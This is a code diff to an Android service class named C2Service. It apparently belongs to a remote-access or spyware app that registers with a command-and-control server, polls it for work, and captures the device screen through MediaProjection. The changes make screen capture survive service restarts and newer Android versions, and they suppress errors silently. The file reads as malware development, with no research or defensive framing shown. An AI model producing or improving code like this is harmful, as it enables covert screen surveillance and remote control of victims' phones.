@@ -27,46 +27,71 @@ class C2Service : Service() {
     private val deviceId: String by lazy { DeviceInfo.id(this) }
     private lateinit var serverUrl: String
 
-    // Live MediaProjection shared across screenshots
     @Volatile private var projection: MediaProjection? = null
+    @Volatile private var projectionActive = false
 
     override fun onCreate() {
         super.onCreate()
         startForeground(1, buildNotification())
         serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
             .getString("server_url", BuildConfig.C2_URL)!!
-        tryInitProjection()
+
+        // Try stored permission (may fail on newer Android)
+        tryInitProjectionFromPrefs()
+
         scope.launch { registerLoop() }
         scope.launch { pollLoop() }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Retry projection init whenever service is restarted
-        if (projection == null) tryInitProjection()
+        // If we receive a live Intent (fresh permission), use it
+        if (intent?.action == "START_PROJECTION") {
+            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
+            val data = if (Build.VERSION.SDK_INT >= 33)
+                intent.getParcelableExtra("proj_data", Intent::class.java)
+            else
+                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
+            if (code != Int.MIN_VALUE && data != null) {
+                initProjectionFromIntent(code, data)
+            }
+        }
         return START_STICKY
     }
 
-    private fun tryInitProjection() {
-        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
-        val resultCode = prefs.getInt("proj_code", Int.MIN_VALUE)
-        val dataStr = prefs.getString("proj_data", null)
-        if (resultCode == Int.MIN_VALUE || dataStr == null) return
-
+    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
         try {
             val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            val projData = Intent.parseUri(dataStr, 0)
-            val proj = mpm.getMediaProjection(resultCode, projData)
-            if (proj == null) return
+            // Stop any previous projection cleanly
+            try { projection?.stop() } catch (_: Exception) {}
+            projection = null
+            projectionActive = false
 
+            val proj = mpm.getMediaProjection(resultCode, data) ?: return
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
                     projection = null
+                    projectionActive = false
                 }
             }, android.os.Handler(android.os.Looper.getMainLooper()))
-
             projection = proj
+            projectionActive = true
         } catch (_: Exception) {
             projection = null
+            projectionActive = false
+        }
+    }
+
+    private fun tryInitProjectionFromPrefs() {
+        // Best-effort: may fail on Android 14+ if URI round-trip loses data
+        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
+        val code = prefs.getInt("proj_code", Int.MIN_VALUE)
+        val uri = prefs.getString("proj_data", null) ?: return
+        if (code == Int.MIN_VALUE) return
+        try {
+            val data = Intent.parseUri(uri, 0)
+            initProjectionFromIntent(code, data)
+        } catch (_: Exception) {
+            // Silent: live Intent will be provided via onStartCommand
         }
     }
 
@@ -169,6 +194,7 @@ class C2Service : Service() {
     override fun onDestroy() {
         try { projection?.stop() } catch (_: Exception) {}
         projection = null
+        projectionActive = false
         scope.cancel()
         super.onDestroy()
     }
